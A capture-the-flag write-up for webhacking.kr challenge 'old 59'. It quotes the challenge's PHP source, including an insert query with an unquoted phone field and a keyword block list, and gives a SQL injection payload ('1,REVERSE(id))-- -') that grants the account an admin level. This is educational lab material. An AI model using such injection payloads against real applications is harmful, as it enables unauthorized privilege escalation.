# Old 59    SQLi (Reverse)

URL: [https://webhacking.kr/challenge/web-36/?view_source=1](https://webhacking.kr/challenge/web-36/?view_source=1)

```php
<?php
include "../../config.php";
if ($_GET['view_source']) view_source();
$db = dbconnect();
if ($_POST['lid'] && isset($_POST['lphone'])) {
    $_POST['lid']    = addslashes($_POST['lid']);    # Login ID
    $_POST['lphone'] = addslashes($_POST['lphone']); # Login Phone
    $result          = mysqli_fetch_array(mysqli_query($db, "select id,lv from chall59 where id='{$_POST['lid']}' and phone='{$_POST['lphone']}'"));
    if ($result['id']) {
        echo "id : {$result['id']}<br>lv : {$result['lv']}<br><br>";
        if ($result['lv'] == "admin") {
            mysqli_query($db, "delete from chall59");
            solve(59);
        }
        echo "<br><a href=./?view_source=1>view-source</a>";
        exit();
    }
}
if ($_POST['id'] && isset($_POST['phone'])) {
    $_POST['id']    = addslashes($_POST['id']);    # ID
    $_POST['phone'] = addslashes($_POST['phone']); # Phone
    if (strlen($_POST['phone']) >= 20)        exit("Access Denied");
    if (preg_match("/admin/i", $_POST['id'])) exit("Access Denied");
    if (preg_match("/admin|0x|#|hex|char|ascii|ord|select/i", $_POST['phone'])) exit("Access Denied");
    mysqli_query($db, "insert into chall59 values('{$_POST['id']}',{$_POST['phone']},'guest')");
}
?>
```

Since php does `addslashes` we can't really inject quotes to escape the query, but `phone` value doesn't have string around it and we can use that.

```sql
insert into chall59 values('{$_POST['id']}', {$_POST['phone']}, 'guest');

Username: nimda
Phone   : 1,REVERSE(id))-- -
```

Login:

![old-59.png](/assets/ctf/webhacking.kr/old-59.png)
